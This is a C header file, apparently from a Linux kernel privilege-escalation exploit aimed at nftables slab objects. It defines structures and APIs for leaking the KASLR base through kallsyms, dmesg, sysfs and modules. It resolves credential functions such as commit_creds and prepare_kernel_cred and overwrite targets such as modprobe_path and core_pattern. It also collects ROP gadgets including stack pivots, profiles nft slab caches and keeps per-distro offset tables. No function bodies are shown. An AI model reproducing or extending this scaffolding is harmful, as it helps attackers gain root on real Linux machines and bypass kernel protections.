#ifndef OFFSETS_H
#define OFFSETS_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

/* ── resolution bitmask ───────────────────────────────────────── */

#define OFF_KERNEL_BASE  (1u << 0)
#define OFF_MODPROBE     (1u << 1)
#define OFF_CRED_FUNCS   (1u << 2)
#define OFF_GADGETS      (1u << 3)
#define OFF_SLAB_INFO    (1u << 4)
#define OFF_STRUCT_OFFS  (1u << 5)
#define OFF_KPTI         (1u << 6)
#define OFF_CORE_PATTERN (1u << 7)

/* ── slab cache info ──────────────────────────────────────────── */

struct slab_info {
    char     name[64];
    uint32_t obj_size;
    uint32_t objs_per_slab;
    uint32_t pages_per_slab;
    uint32_t active_objs;
    uint32_t num_objs;
    uint32_t active_slabs;
    uint32_t num_slabs;
};

/* ── resolved kernel offsets ──────────────────────────────────── */

struct kernel_offsets {
    uint32_t resolved;          /* bitmask of OFF_* flags */

    /* absolute virtual addresses (0 = unresolved) */
    uint64_t kernel_base;       /* _text / _stext */
    uint64_t modprobe_path;
    uint64_t core_pattern;      /* alternative overwrite target */
    uint64_t poweroff_cmd;      /* alternative overwrite target */
    uint64_t prepare_kernel_cred;
    uint64_t commit_creds;
    uint64_t swapgs_restore_regs;
    uint64_t kpti_trampoline;
    uint64_t find_task_by_vpid;
    uint64_t switch_task_namespaces;
    uint64_t init_nsproxy;

    /* struct field offsets within task_struct / cred */
    uint32_t task_to_cred;      /* offsetof(task_struct, cred) */
    uint32_t cred_to_uid;       /* offsetof(cred, uid) */
    uint32_t cred_usage;        /* offsetof(cred, usage) */

    /* ROP gadgets (absolute addresses, 0 = unfound) */
    uint64_t pop_rdi_ret;
    uint64_t pop_rsi_ret;
    uint64_t pop_rdx_ret;
    uint64_t pop_rcx_ret;
    uint64_t pop_rax_ret;
    uint64_t pop_r8_ret;
    uint64_t xchg_rax_rsp_ret;
    uint64_t push_rax_pop_rsp_ret;
    uint64_t mov_rdi_rax_call_rdx;
    uint64_t ret;

    /* slab info for nft objects */
    struct slab_info nft_chain_slab;
    struct slab_info nft_set_slab;
    struct slab_info target_slab;   /* whichever cache we're targeting */
};

/* ── hardcoded offset entry (for known distro kernels) ────────── */

struct offset_entry {
    const char *release_glob;   /* uname -r pattern, fnmatch syntax */
    const char *distro;

    /* offsets relative to kernel_base (_text) */
    int64_t  modprobe_path_off;
    int64_t  prepare_kernel_cred_off;
    int64_t  commit_creds_off;
    int64_t  swapgs_restore_regs_off;
    int64_t  kpti_trampoline_off;
    int64_t  core_pattern_off;

    /* gadget offsets relative to _text */
    int64_t  pop_rdi_ret_off;
    int64_t  pop_rsi_ret_off;
    int64_t  pop_rdx_ret_off;
    int64_t  pop_rax_ret_off;
    int64_t  xchg_rax_rsp_ret_off;
    int64_t  mov_rdi_rax_call_rdx_off;
    int64_t  ret_off;

    /* struct offsets */
    uint32_t task_to_cred;
    uint32_t cred_to_uid;

    /* slab sizes */
    uint32_t nft_chain_obj_size;
    uint32_t nft_set_obj_size;
};

/* ── offsets.c API ────────────────────────────────────────────── */

/* full resolution pipeline: kallsyms -> hardcoded db -> vmlinux scan */
int offsets_resolve(struct kernel_offsets *ko, const char *release);

/* individual resolution strategies */
int offsets_from_kallsyms(struct kernel_offsets *ko);
int offsets_from_database(struct kernel_offsets *ko, const char *release);
int offsets_from_vmlinux(struct kernel_offsets *ko, const char *vmlinux_path);

/* slab profiling */
int slab_info_by_name(const char *cache_name, struct slab_info *si);
int slab_info_for_size(size_t obj_size, struct slab_info *si);
int slab_find_nft_caches(struct kernel_offsets *ko);

/* pretty-print resolved offsets */
void offsets_print(const struct kernel_offsets *ko);

/* ── kaslr.c API ──────────────────────────────────────────────── */

uint64_t kaslr_leak_base(void);
uint64_t kaslr_from_kallsyms(void);
uint64_t kaslr_from_sysfs_notes(void);
uint64_t kaslr_from_dmesg(void);
uint64_t kaslr_from_modules(void);

/* ── vmlinux.c API ────────────────────────────────────────────── */

/* extract vmlinux from /boot/vmlinuz-*, writes to outpath, returns 0 on success */
int vmlinux_extract(const char *vmlinuz_path, const char *outpath);

/* find vmlinuz for running kernel */
int vmlinux_find_boot_image(char *path, size_t pathsz);

/* ── gadgets.c API ────────────────────────────────────────────── */

/* scan an extracted vmlinux ELF for ROP gadgets, fills ko->gadget fields */
int gadgets_scan(const char *vmlinux_path, struct kernel_offsets *ko);

/* vmlinux ELF section helpers (used by gadgets.c) */
int vmlinux_find_text_section(const char *path,
                              uint64_t *vaddr, uint64_t *offset,
                              uint64_t *size);

#endif
